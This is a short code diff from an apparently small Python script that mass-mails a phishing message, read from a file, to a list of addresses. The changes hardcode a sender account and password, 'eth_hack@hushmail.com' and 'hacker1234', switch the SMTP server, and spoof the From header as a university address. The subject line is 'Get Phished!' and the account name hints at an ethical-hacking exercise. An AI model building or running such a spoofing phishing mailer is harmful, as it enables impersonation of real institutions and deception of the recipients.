@@ -113,22 +113,21 @@ if args.cid:
 ####################################
 # send email to list of addresses
 ####################################
-FROM_ADDR = 'alexirion10@gmail.com'
-PASSWD = ''
+FROM_ADDR = 'eth_hack@hushmail.com'
+PASSWD = 'hacker1234'
 
 
 for email in email_list:
     print(email)
 
 msg = MIMEMultipart()
-msg['From'] = FROM_ADDR
+msg['From'] = 'san@utexas.edu'
 msg['Subject'] = 'Get Phished!'
 phish_mail_file = open('phishing_email.txt', 'rb')
 msg.attach(MIMEText(phish_mail_file.read()))
 phish_mail_file.close()
 
-server = smtplib.SMTP('smtp.gmail.com', 587)
-server.ehlo()
+server = smtplib.SMTP('smtp.hushmail.com', 587)
 server.starttls()
 server.login(FROM_ADDR, PASSWD)
 
